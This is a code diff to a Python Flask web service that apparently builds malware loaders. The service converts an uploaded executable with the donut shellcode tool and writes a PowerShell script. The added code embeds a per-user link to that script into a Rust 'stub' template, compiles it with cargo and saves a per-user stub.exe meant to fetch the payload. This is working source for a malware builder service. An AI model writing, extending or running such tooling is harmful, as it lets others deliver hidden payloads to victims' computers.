@@ -1,6 +1,9 @@
 import os
 import json
 import donut
+import tempfile
+import shutil
+import subprocess
 from flask import Flask, request, jsonify, send_file
 
 app = Flask(__name__)
@@ -83,12 +86,45 @@ def generator():
     with open(ps_save_path, "w") as f:
         f.write(ps_script)
 
+    raw_link = f"http://127.0.0.1:5000/{user_id}/ps/{ps_filename}?raw_key={users[key]['raw_key']}"
+
+    with tempfile.TemporaryDirectory() as temp_dir:
+        temp_stub_path = os.path.join(temp_dir, "stub")
+        shutil.copytree("templates/stub", temp_stub_path)
+
+        # Stub'ı derle ve raw_link'i ekle
+        stub_main_path = os.path.join(temp_stub_path, "src", "main.rs")
+        with open(stub_main_path, "r") as f:
+            stub_code = f.read()
+
+        stub_code = stub_code.replace("REPLACE_ME_WITH_RAW_LINK", raw_link)
+
+        with open(stub_main_path, "w") as f:
+            f.write(stub_code)
+
+        # Build the stub
+        try:
+            subprocess.run(["cargo", "build", "--release"], cwd=temp_stub_path, check=True)
+        except subprocess.CalledProcessError as e:
+            return jsonify({"error": "Failed to build the stub", "details": str(e)}), 500
+
+        # Move the compiled exe to the stubs folder
+        user_exe_dir = f"stubs/{user_id}/exe"
+        os.makedirs(user_exe_dir, exist_ok=True)
+
+        built_exe_path = os.path.join(temp_stub_path, "target", "release", "stub.exe")
+        new_exe_path = os.path.join(user_exe_dir, f"{user_id}.exe")
+
+        if os.path.exists(built_exe_path):
+            shutil.move(built_exe_path, new_exe_path)
+
     return jsonify({
         "status": "success",
         "message": "File processed successfully",
         "exe_saved_as": filename,
         "ps_saved_as": ps_filename,
-        "ps_path": ps_save_path
+        "ps_path": ps_save_path,
+        "raw_link": raw_link
     })
 
 @app.route("/<user_id>/ps/<ps_filename>")
